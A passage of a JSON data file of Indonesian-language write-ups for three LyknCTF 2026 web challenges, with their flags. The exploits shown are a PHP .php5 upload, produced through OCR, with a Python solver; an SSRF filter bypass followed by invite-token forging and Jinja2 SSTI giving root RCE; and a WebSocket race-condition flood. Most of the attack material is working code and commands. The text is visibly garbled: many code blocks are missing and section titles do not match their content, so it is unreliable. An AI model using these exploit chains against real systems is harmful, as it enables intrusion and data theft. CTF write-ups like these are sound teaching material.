    "id": "lyknctf2026-web-ocr",
    "title": "OCR — Web CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**CTF:** LYKNCTF 2026  \n**Category:** Web  \n**Challenge:** OCR  \n**Flag:** `LYKNCTF{61b9716599224e1eb7a5ba08723b6559}`",
    "problemDescription": "> An exposed OCR note saver. Draw, recognize, save — and see what a note can become.\n\nAplikasi menerima gambar PNG dari canvas, menjalankan OCR dengan Tesseract, lalu menyimpan hasil OCR sebagai file di direktori `saved/`.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Alur aplikasinya terdiri dari dua request:\n\n1. Kirim `image_data` dalam bentuk data URI PNG.\n2. Server menampilkan hasil OCR dan memberikan `ocr_id`.\n3. `ocr_id` dipakai untuk menyimpan teks OCR dengan nama file pilihan user.\n\nContoh menyimpan note normal:\n\n\n\nFile tersimpan dan dapat diakses langsung melalui:",
        "code": "curl -sS -c cookies.txt -b cookies.txt -X POST \"$BASE/\" \\\n  --data-urlencode \"image_data=data:image/png;base64,$(base64 -w0 note.png)\" \\\n  -o response.html\n\nOCR_ID=$(grep -oP 'name=\"ocr_id\" value=\"\\K[^\"]+' response.html)\n\ncurl -sS -c cookies.txt -b cookies.txt -X POST \"$BASE/\" \\\n  --data-urlencode 'save_output=1' \\\n  --data-urlencode \"ocr_id=$OCR_ID\" \\\n  --data-urlencode 'filename=note.txt'"
      },
      {
        "title": "Filter yang Diterapkan",
        "content": "Server menolak beberapa ekstensi executable:\n\n\n\nServer juga memblokir teks OCR yang terlihat berbahaya, misalnya:\n\n\n\nBlacklist ekstensi tersebut tidak mencakup seluruh ekstensi PHP lama.\n\nPengujian beberapa ekstensi memberi hasil:\n\n\n\nPayload berikut membuktikan bahwa `.php5` diproses oleh PHP:\n\n\n\nSaat file diakses, responsnya hanya:\n\n\n\nAda dua celah yang dapat digabungkan:\n\n- blacklist ekstensi melewatkan `.php5`;\n- PHP short open tag `<? ... ?>` aktif dan tidak diblokir seperti `<?php` atau `<?=`.",
        "code": ".php\n.phtml\n.phar\n.inc\n.cgi\n.pl\n.py\n.sh"
      },
      {
        "title": "Kendala OCR",
        "content": "Payload awal untuk membaca flag memakai:\n\n\n\nTesseract mengubah underscore menjadi spasi:\n\n\n\nPHP kemudian menghasilkan parse error.\n\nFungsi `readfile()` dipilih karena tidak memiliki underscore:\n\n\n\nHasil OCR tetap valid dan payload lolos filter.",
        "code": "<? echo file_get_contents(\"/flag\"); ?>"
      },
      {
        "title": "Exploit",
        "content": "Generate gambar yang berisi payload:\n\n\n\nKirim ke OCR:\n\n\n\nAmbil `ocr_id`:\n\n\n\nSimpan sebagai file `.php5`:\n\n\n\nAkses file hasil simpan:",
        "code": "convert -size 2000x340 xc:white \\\n  -fill black \\\n  -font DejaVu-Sans-Mono \\\n  -pointsize 90 \\\n  -gravity center \\\n  -annotate 0 '<? readfile(\"/flag\"); ?>' \\\n  /tmp/flag.png"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "LYKNCTF{61b9716599224e1eb7a5ba08723b6559}"
      },
      {
        "title": "Root Cause",
        "content": "Validasi filename memakai blacklist ekstensi yang tidak lengkap. Web server masih memiliki handler PHP untuk `.php5`, sehingga file yang dianggap note biasa berubah menjadi executable script.\n\nFilter isi juga hanya mencari pola tertentu dan tidak menormalkan seluruh variasi sintaks PHP. Short open tag dapat melewati pemeriksaan tersebut."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport argparse\r\nimport base64\r\nimport html\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport tempfile\r\nfrom pathlib import Path\r\n\r\nimport requests\r\n\r\n\r\ndef generate_payload_image(path: Path) -> None:\r\n    payload = '<? readfile(\"/flag\"); ?>'\r\n    subprocess.run(\r\n        [\r\n            \"convert\",\r\n            \"-size\", \"2000x340\",\r\n            \"xc:white\",\r\n            \"-fill\", \"black\",\r\n            \"-font\", \"DejaVu-Sans-Mono\",\r\n            \"-pointsize\", \"90\",\r\n            \"-gravity\", \"center\",\r\n            \"-annotate\", \"0\",\r\n            payload,\r\n            str(path),\r\n        ],\r\n        check=True,\r\n    )\r\n\r\n\r\ndef extract(pattern: str, body: str, label: str) -> str:\r\n    match = re.search(pattern, body, re.S)\r\n    if not match:\r\n        raise RuntimeError(f\"failed to extract {label}\")\r\n    return html.unescape(match.group(1))\r\n\r\n\r\ndef main() -> int:\r\n    parser = argparse.ArgumentParser(description=\"LYKNCTF 2026 OCR solver\")\r\n    parser.add_argument(\"base_url\", help=\"instance URL, e.g. http://host:8080\")\r\n    args = parser.parse_args()\r\n\r\n    base = args.base_url.rstrip(\"/\")\r\n    session = requests.Session()\r\n\r\n    with tempfile.TemporaryDirectory() as tmp:\r\n        image_path = Path(tmp) / \"flag.png\"\r\n        generate_payload_image(image_path)\r\n\r\n        image_data = base64.b64encode(image_path.read_bytes()).decode()\r\n        response = session.post(\r\n            f\"{base}/\",\r\n            data={\"image_data\": f\"data:image/png;base64,{image_data}\"},\r\n            timeout=30,\r\n        )\r\n        response.raise_for_status()\r\n\r\n        ocr_id = extract(\r\n            r'name=\"ocr_id\"\\s+value=\"([^\"]+)\"',\r\n            response.text,\r\n            \"ocr_id\",\r\n        )\r\n        recognized = extract(r\"<pre>(.*?)</pre>\", response.text, \"OCR text\")\r\n\r\n        print(f\"[+] OCR ID: {ocr_id}\")\r\n        print(f\"[+] OCR text: {recognized}\")\r\n\r\n        expected = '<? readfile(\"/flag\"); ?>'\r\n        if recognized.strip() != expected:\r\n            raise RuntimeError(\r\n                \"OCR output differs from payload; adjust font or point size\"\r\n            )\r\n\r\n        save = session.post(\r\n            f\"{base}/\",\r\n            data={\r\n                \"save_output\": \"1\",\r\n                \"ocr_id\": ocr_id,\r\n                \"filename\": \"flag.php5\",\r\n            },\r\n            timeout=30,\r\n        )\r\n        save.raise_for_status()\r\n\r\n        notice = re.search(r'notice [^\"]+\">([^<]+)', save.text)\r\n        if notice:\r\n            print(f\"[+] Save response: {html.unescape(notice.group(1))}\")\r\n\r\n        result = session.get(f\"{base}/saved/flag.php5\", timeout=30)\r\n        result.raise_for_status()\r\n\r\n        flag = re.search(r\"LYKNCTF\\{[^}]+\\}\", result.text)\r\n        if not flag:\r\n            print(result.text)\r\n            raise RuntimeError(\"flag not found in PHP5 response\")\r\n\r\n        print(f\"[+] Flag: {flag.group(0)}\")\r\n        return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    try:\r\n        raise SystemExit(main())\r\n    except (requests.RequestException, subprocess.CalledProcessError, RuntimeError) as exc:\r\n        print(f\"[-] {exc}\", file=sys.stderr)\r\n        raise SystemExit(1)"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{61b9716599224e1eb7a5ba08723b6559}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-thinkmore",
    "title": "ThinkMore",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "Writeup for challenge ThinkMore",
    "problemDescription": "```text\nTemplate changes are stored by the PHP frontend and rendered by the\ninternal invoice worker during preview.\n```\n\nContext yang tersedia:\n\n```text\ncustomer_name\nreviewer_name\namount\n```\n\nPreview dibuat melalui:\n\n```text\nPOST /admin/billing/preview\n```\n\n---\n\n\nJavaScript client memblokir sintaks seperti `{{ ... }}`, tetapi server tidak melakukan validasi yang sama.\n\nPayload dikirim langsung menggunakan `curl`:\n\n```bash\ncurl -sS -o /dev/null \\\n  -b \"$J\" \\\n  -X POST \"$BASE/admin/billing/template\" \\\n  --data-urlencode 'billing_template=SSTI_TEST_{{7*7}}_END'\n```\n\nKemudian preview dibuat:\n\n```bash\ncurl -sS \\\n  -b \"$J\" \\\n  -X POST \"$BASE/admin/billing/preview\"\n```",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Kategori:** Web\n- **Judul:** ThinkMore\n- **Deskripsi:**\n\n> \"If you know the enemy and know yourself, you need not fear the results of a hundred battles. If you know yourself but not the enemy, for every victory gained you will also suffer defeat.\"\n>\n> Sun Tzu, *Art of War*\n\n- **Flag:**\n\n\n\n---",
        "code": "LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}"
      },
      {
        "title": "Output:",
        "content": "Dua petunjuk langsung terlihat:\n\n1. Ada service atau komponen bernama `cache-proxy`.\n2. Ada editor template yang hanya diblokir lewat JavaScript browser.\n\nPada tahap ini belum diketahui di mana form template berada, tetapi jelas ada kemungkinan SSTI jika request dikirim langsung tanpa browser.\n\nForm registrasi:\n\n\n\n---\n\n\nAkun biasa dibuat untuk melihat attack surface setelah autentikasi.\n\n\n\nOutput pemetaan halaman sesudah login:\n\n\n\nDashboard menampilkan role akun:\n\n\n\nIsi dashboard awal:\n\n\n\nPetunjuk penting:\n\n- Ada **cached preview**.\n- Fetching dilakukan oleh **renderer worker terpisah**.\n- User biasa belum memiliki vendor.\n\n---\n\n\nForm profile hanya menampilkan field username:\n\n\n\nDicoba beberapa parameter tambahan:",
        "code": "// TODO: move cache-proxy to CDN before GA\ndocument.addEventListener('DOMContentLoaded', () => {\n  const guardedForm = document.querySelector('[data-template-guard]');\n  const templateInput = document.querySelector('[data-template-input]');\n  const warning = document.querySelector('[data-template-warning]');\n\n  if (guardedForm && templateInput && warning) {\n    guardedForm.addEventListener('submit', (event) => {\n      const value = templateInput.value;\n      if (value.includes('{{') || value.includes('{%') || value.includes('}}') || value.includes('%}')) {\n        event.preventDefault();\n        warning.hidden = false;\n        warning.textContent = 'The browser editor blocked protected placeholder syntax.';\n      }\n    });\n  }\n});"
      },
      {
        "title": "Output:",
        "content": "",
        "code": "=== role=admin ===\nrole <strong>user\n\n=== is_admin=1 ===\nrole <strong>user\n\n=== admin=1 ===\nrole <strong>user\n\n=== user[role]=admin ===\nrole <strong>user\n\n=== profile[role]=admin ===\nrole <strong>user"
      },
      {
        "title": "Kesimpulan:",
        "content": "---\n\n\nFuzzing route dilakukan setelah login, karena endpoint tertentu hanya muncul untuk user terautentikasi.\n\n\n\nOutput penting:\n\n\n\nRoute baru:\n\n\n\nAkses langsung `/admin` mengembalikan redirect ke dashboard:\n\n\n\nHeader release ini nantinya sangat penting:\n\n\n\n---\n\n\nIsi `/mirror`:\n\n\n\nDeskripsi fitur:\n\n\n\nIni merupakan indikasi kuat SSRF.\n\n---\n\n\nDicoba beberapa URL loopback:\n\n\n\nSemua request berhasil masuk ke queue:\n\n\n\nNamun dashboard menunjukkan:\n\n\n\nDetail vendor:",
        "code": "Profile tidak rentan mass assignment."
      },
      {
        "title": "Kesimpulan:",
        "content": "---\n\n\nBeberapa representasi IP dicoba:\n\n\n\nOutput penting:\n\n\n\nRepresentasi berikut lolos validasi awal:\n\n\n\nLibrary HTTP kemudian menormalisasinya menjadi:\n\n\n\nIni membuktikan SSRF filter memiliki canonicalization mismatch.\n\nTes ke port aplikasi:",
        "code": "Fitur server-side fetch benar-benar ada, tetapi memiliki filter loopback/private IP."
      },
      {
        "title": "Output:",
        "content": "Worker ternyata berjalan di container terpisah. Loopback worker bukan frontend PHP.\n\n---\n\n\nSejumlah hostname service internal dicoba:\n\n\n\nPort yang diuji:\n\n\n\nOutput paling penting:\n\n\n\nService internal ditemukan:\n\n\n\nHostname `renderer` justru di-resolve ke loopback:\n\n\n\n---\n\n\nEndpoint umum diuji:",
        "code": "Status: Fetch failed: Failed to connect to 127.0.0.1 port 8080"
      },
      {
        "title": "Output:",
        "content": "Isi respons root dan health:\n\n\n\nEndpoint diagnostik internal ditemukan:\n\n\n\n---\n\n\nSSRF diarahkan ke:",
        "code": "/health  Fetched with HTTP 200\n/        Fetched with HTTP 200"
      },
      {
        "title": "Output:",
        "content": "Informasi sensitif yang bocor:\n\n\n\n---\n\n\nAsset debug diambil melalui SSRF:\n\n\n\nIsi source map:\n\n\n\nInformasi penting:\n\n\n\nFormula secret:\n\n\n\nNilai yang telah diketahui:\n\n\n\n---\n\n\nPayload token:\n\n\n\nCanonical JSON dibuat dengan key yang diurutkan dan separator tanpa spasi.\n\nBase64 URL-safe payload kemudian digabung dengan signature HMAC-SHA256.\n\nBeberapa kemungkinan interpretasi key diuji:",
        "code": "TEAM_SLUG=vrp-alpha\nINVITE_KEY_PART=renderer-preview-seed\nBUILD_LABEL=invoice-renderer-debug\nINSTANCE_SEED=5c622a01c7e991dafdcbabe0631e6dd4\nDEBUG_ASSET=/static/internal-app.js.map"
      },
      {
        "title": "Output:",
        "content": "Token valid:\n\n\n\nSetelah token diterima:\n\n\n\nDashboard sekarang menampilkan link:\n\n\n\n---\n\n\nHalaman `/admin` menampilkan fitur billing template.",
        "code": "PROFILE_STATUS = 200\nEMAIL = nata1783440206@test.local\n\nhex-secret + hex-signature:\nstatus=200\nflash=Invite token was rejected.\nrole=user\n\nraw-secret + hex-signature:\nstatus=200\nflash=Backoffice access granted.\nrole=admin"
      },
      {
        "title": "Form:",
        "content": "",
        "code": "<form action=\"/admin/billing/template\" method=\"post\" data-template-guard>\n    <textarea\n        id=\"billing_template\"\n        name=\"billing_template\"\n        data-template-input\n    >\n        &lt;h1&gt;Invoice for Cedar Supplies&lt;/h1&gt;\n        &lt;p&gt;Prepared by Review Desk&lt;/p&gt;\n        &lt;p&gt;Total due: $1480&lt;/p&gt;\n    </textarea>\n</form>"
      },
      {
        "title": "Output:",
        "content": "Baris pertama adalah template yang tersimpan.\n\nBaris kedua adalah hasil render worker:",
        "code": "SSTI_TEST_{{7*7}}_END\nSSTI_TEST_49_END"
      },
      {
        "title": "Kesimpulan:",
        "content": "---\n\n\nGadget Jinja2 yang digunakan:\n\n\n\nTes environment:\n\n\n\nOutput penting:\n\n\n\nNilai tersebut jelas decoy.\n\n---\n\n\nCommand panjang dikirim dalam Base64 agar aman dari masalah quoting.\n\nPayload shell:",
        "code": "SSTI Jinja2 terkonfirmasi."
      },
      {
        "title": "Output:",
        "content": "RCE berjalan sebagai:\n\n\n\n---\n\n\nFile berikut dibaca:\n\n\n\nIsi penting:\n\n\n\nRoot cause SSTI:\n\n\n\nTemplate sepenuhnya dikontrol admin user dan dirender tanpa sandbox atau sanitasi server-side.\n\n---\n\n\nCommand berikut dijalankan melalui SSTI RCE:\n\n\n\nOutput environment penting:\n\n\n\nRoot filesystem:\n\n\n\nOutput directory `/app`:",
        "code": "/app\nuid=0(root) gid=0(root) groups=0(root)\n\n---CANDIDATES---\n/app/internal/app.py"
      },
      {
        "title": "Network:",
        "content": "Temuan final:\n\n\n\n---\n\n\nPayload final:\n\n\n\nCommand lengkap:",
        "code": "127.0.0.1 cache-proxy\n10.0.1.204 da11b5ebf477"
      },
      {
        "title": "Output:",
        "content": "---\n\n\n\n\n---",
        "code": "LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}"
      },
      {
        "title": "1. Register dan Login",
        "content": "",
        "code": "BASE='http://TARGET:8080'\nU=\"nata$(date +%s)\"\nE=\"$U@test.local\"\nP='ThinkMore123!'\nJ=/tmp/thinkmore.cookie\n\ncurl -sS -o /dev/null -c \"$J\" \\\n  -X POST \"$BASE/register\" \\\n  --data-urlencode \"username=$U\" \\\n  --data-urlencode \"email=$E\" \\\n  --data-urlencode \"password=$P\"\n\ncurl -sS -o /dev/null -b \"$J\" -c \"$J\" \\\n  -X POST \"$BASE/login\" \\\n  --data-urlencode \"email=$E\" \\\n  --data-urlencode \"password=$P\""
      },
      {
        "title": "2. Ambil Build Info Internal lewat SSRF",
        "content": "Informasi yang diperlukan:",
        "code": "curl -sS -o /dev/null -b \"$J\" \\\n  -X POST \"$BASE/mirror\" \\\n  --data-urlencode \"name=buildinfo\" \\\n  --data-urlencode \\\n  \"logo_url=http://cache-proxy:5000/internal/build-info\""
      },
      {
        "title": "3. Ambil Source Map",
        "content": "Source map membocorkan algoritma invite token.",
        "code": "curl -sS -o /dev/null -b \"$J\" \\\n  -X POST \"$BASE/mirror\" \\\n  --data-urlencode \"name=sourcemap\" \\\n  --data-urlencode \\\n  \"logo_url=http://cache-proxy:5000/static/internal-app.js.map\""
      },
      {
        "title": "4. Forge Invite Token",
        "content": "",
        "code": "import base64\nimport hashlib\nimport hmac\nimport json\nimport time\n\nemail = \"USER_EMAIL\"\nrelease = \"review-2026.04-teamA\"\nteam = \"vrp-alpha\"\ninvite_key_part = \"renderer-preview-seed\"\ninstance_seed = \"5c622a01c7e991dafdcbabe0631e6dd4\"\n\npayload = {\n    \"email\": email,\n    \"exp\": int(time.time()) + 3600,\n    \"role\": \"admin\",\n    \"scope\": \"backoffice\",\n    \"team\": team,\n}\n\ncanonical = json.dumps(\n    payload,\n    sort_keys=True,\n    separators=(\",\", \":\"),\n)\n\nencoded = base64.urlsafe_b64encode(\n    canonical.encode()\n).rstrip(b\"=\").decode()\n\nmaterial = (\n    f\"{invite_key_part}:{team}:{release}:{instance_seed}\"\n).encode()\n\nderived_secret = hashlib.sha256(material).digest()\n\nsignature = hmac.new(\n    derived_secret,\n    canonical.encode(),\n    hashlib.sha256,\n).hexdigest()\n\ntoken = f\"{encoded}.{signature}\"\n\nprint(token)"
      },
      {
        "title": "Submit:",
        "content": "",
        "code": "curl -sS -b \"$J\" \\\n  -X POST \"$BASE/invite/accept\" \\\n  --data-urlencode \"token=$TOKEN\""
      },
      {
        "title": "1. Authenticated Hidden Route Exposure",
        "content": "Route `/mirror` tidak ditampilkan langsung di dashboard user, tetapi tetap dapat diakses oleh akun biasa setelah ditemukan melalui fuzzing."
      },
      {
        "title": "2. SSRF pada Vendor Fetcher",
        "content": "User dapat mengontrol URL yang diambil oleh worker.\n\nWalaupun ada filter loopback dan private IP, filter tidak menangani seluruh bentuk canonical IP dengan benar.\n\nContoh bypass:",
        "code": "0x7f000001"
      },
      {
        "title": "3. Internal Service Trust Boundary Failure",
        "content": "Service internal:\n\n\n\ndapat diakses melalui fitur mirror.\n\nService ini membocorkan:\n\n- team slug\n- invite key fragment\n- instance seed\n- debug asset path",
        "code": "cache-proxy:5000"
      },
      {
        "title": "4. Source Map Tersedia di Production",
        "content": "Source map internal berisi source JavaScript asli dan algoritma pembuatan token invite.\n\nAsset debug seharusnya tidak tersedia pada build production."
      },
      {
        "title": "5. Predictable Admin Invite Token",
        "content": "Semua bahan pembentukan secret dapat dibaca melalui endpoint internal dan header aplikasi.\n\nAkibatnya attacker dapat membuat token dengan:",
        "code": "role=admin\nscope=backoffice"
      },
      {
        "title": "6. Client-Side-Only Template Protection",
        "content": "Frontend memblokir sintaks Jinja hanya lewat JavaScript:\n\n\n\nRequest langsung menggunakan `curl` melewati proteksi ini.",
        "code": "if (value.includes('{{')) {\n    event.preventDefault();\n}"
      },
      {
        "title": "7. Unsafe `render_template_string`",
        "content": "Renderer menggunakan:\n\n\n\nTemplate yang sepenuhnya dikontrol user langsung diproses oleh Jinja2 tanpa sandbox.",
        "code": "render_template_string(template, **safe_context)"
      },
      {
        "title": "8. Container Berjalan sebagai Root",
        "content": "RCE berjalan sebagai:\n\n\n\nDampak eksploitasi menjadi penuh.",
        "code": "uid=0(root)"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{8977a05ebdf842d69cb1bd54caeb0659}",
    "lessonsLearned": ""
  },
  {
    "id": "lyknctf2026-web-waguri1",
    "title": "Waguri1 — Web CTF",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "LyknCTF 2026",
    "tags": [],
    "description": "**Category:** Web\n**Difficulty:** Easy–Medium\n**Flag:** `LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}`",
    "problemDescription": "**Category:** Web\n**Difficulty:** Easy–Medium\n**Flag:** `LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}`\n\n---",
    "tools": [
      "curl",
      "python3",
      "websockets"
    ],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Description",
        "content": "> The SPAWN button looks harmless, but there's something behind it. Can you find it out?\n\nTarget: `http://<host>:8080/`\n\n---"
      },
      {
        "title": "1. Recon",
        "content": "Mengakses halaman utama menampilkan sebuah tombol **SPAWN** dengan judul halaman **\"Spawn Race\"**. Melihat source HTML, ditemukan bahwa halaman ini membuka koneksi **WebSocket** ke host yang sama:\n\n\n\nKetika tombol SPAWN diklik, client mengirim pesan:\n\n\n\nDan server membalas dengan pesan bertipe `spawned`:\n\n\n\nClient kemudian menampilkan gambar & suara tersebut di layar (efek visual saja, tidak berkaitan langsung dengan flag).\n\n**Petunjuk penting:** judul challenge adalah **\"Spawn Race\"** — mengindikasikan adanya **race condition** yang harus dieksploitasi, bukan cuma UI semata.\n\n---",
        "code": "const socket = new WebSocket(`${protocol}//${window.location.host}`);"
      },
      {
        "title": "2. Hipotesis",
        "content": "Karena setiap klik tombol mengirim satu pesan `spawn` dan mendapat balasan berisi `spawnId` yang increment, kemungkinan besar server menyimpan sebuah **counter global** (misalnya jumlah total spawn) dengan pola **check-then-act** yang tidak *thread-safe* / tidak atomik. Contoh pseudocode rentan di server:\n\n\n\nJika banyak request `spawn` dikirim **secara bersamaan (concurrent)**, ada kemungkinan beberapa request membaca nilai counter yang sama sebelum increment selesai diproses — sehingga kondisi \"menang\" bisa lebih mudah terpicu, atau nilai spawnId tertentu (yang seharusnya cuma dicapai satu klien pertama) bisa \"dicuri\"/didapat lewat flooding.\n\n---",
        "code": "if (spawnCounter === WINNING_ID) {\n  response.race = \"won\";\n  response.flag = FLAG;\n}\nspawnCounter++;"
      },
      {
        "title": "3. Eksploitasi — Race Condition via WebSocket Flooding",
        "content": "Alih-alih klik tombol satu per satu secara manual, dibuat script Python untuk membuka satu koneksi WebSocket lalu **mengirim banyak pesan `spawn` sekaligus secara paralel** menggunakan `asyncio.gather`, sehingga semua request diproses server hampir bersamaan:",
        "code": "import asyncio, websockets, json\n\nasync def spam():\n    async with websockets.connect('ws://<host>:8080/') as ws:\n        await asyncio.gather(*[ws.send(json.dumps({'type': 'spawn'})) for _ in range(50)])\n        try:\n            while True:\n                msg = await asyncio.wait_for(ws.recv(), timeout=1)\n                print(msg)\n        except asyncio.TimeoutError:\n            pass\n\nasyncio.run(spam())"
      },
      {
        "title": "Hasil",
        "content": "Dari 50 request yang dikirim paralel, salah satu balasan (spawnId ke-6) berisi field tambahan `race: \"won\"` beserta flag:\n\n\n\nRequest lain (spawnId 1–5, 7–50) hanya berisi data spawn biasa tanpa flag.\n\n---",
        "code": "{\"type\":\"spawned\",\"image\":\"/images/1.gif\",\"sound\":\"/sounds/4.mp3\",\"spawnId\":6,\"race\":\"won\",\"flag\":\"LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}\"}"
      },
      {
        "title": "4. Root Cause",
        "content": "- Server memiliki logika \"pemenang\" yang bergantung pada urutan/nilai counter spawn yang diproses secara **non-atomik**.\n- Karena tidak ada locking/mutex saat memproses request `spawn` secara bersamaan, mengirim banyak request dalam waktu hampir bersamaan (race) memungkinkan kondisi kemenangan tercapai/terpicu jauh lebih cepat dan lebih pasti dibanding hanya mengklik tombol secara normal satu-satu.\n- Ini adalah contoh klasik **race condition (TOCTOU – Time Of Check To Time Of Use)** pada aplikasi berbasis WebSocket/state server-side.\n\n---"
      },
      {
        "title": "5. Mitigasi (Rekomendasi Perbaikan)",
        "content": "1. Gunakan **atomic increment/compare-and-swap** pada counter, bukan read-then-write terpisah.\n2. Terapkan **locking/mutex** per-koneksi atau per-session saat memproses event kritikal.\n3. Jangan mengandalkan urutan pesan client sebagai satu-satunya penentu logika sensitif (seperti pemberian flag/reward).\n4. Rate-limit jumlah pesan WebSocket per detik dari satu koneksi/IP.\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "LYKNCTF{cb1f7e69904b4af5b3200d5bf0d3ad48}",
    "lessonsLearned": ""
  }
];
